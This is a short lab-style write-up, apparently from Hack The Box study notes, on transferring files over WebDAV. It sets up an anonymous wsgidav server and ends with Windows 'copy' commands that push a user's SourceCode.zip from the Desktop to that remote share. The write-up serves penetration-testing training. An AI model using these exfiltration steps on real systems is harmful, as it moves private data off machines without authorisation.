---
description: >-
  WebDAV Uploading files via SMB (over HTTP)
title: WebDAV Uploading files via SMB (over HTTP)           # Add title here
date: 2024-01-15 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, WebDAV Uploading Files]                     # Change Templates to Writeup
tags: [file transfer, webdav, smb]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### SMB Uploads

We can run SMB over HTTP with WebDav. WebDAV is an extension of HTTP, the WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share testing3, and because it didn't find anything with SMB, it uses HTTP.

To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot [wsgidav github](https://github.com/mar10/wsgidav) After installing them, we run the wsgidav application in the target directory.

### Installing WebDav Python modules
```bash
Shuciran@htb[/htb]$ sudo pip install wsgidav cheroot
```
```bash
Shuciran@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

### Connecting to the Webdav Share
Now we can attempt to connect to the share using the DavWWWRoot directory.

```powershell
C:\htb> dir \\192.168.49.128\DavWWWRoot
 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

> DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
{: .prompt-warning }

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

### Uploading Files using SMB
```powershell
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```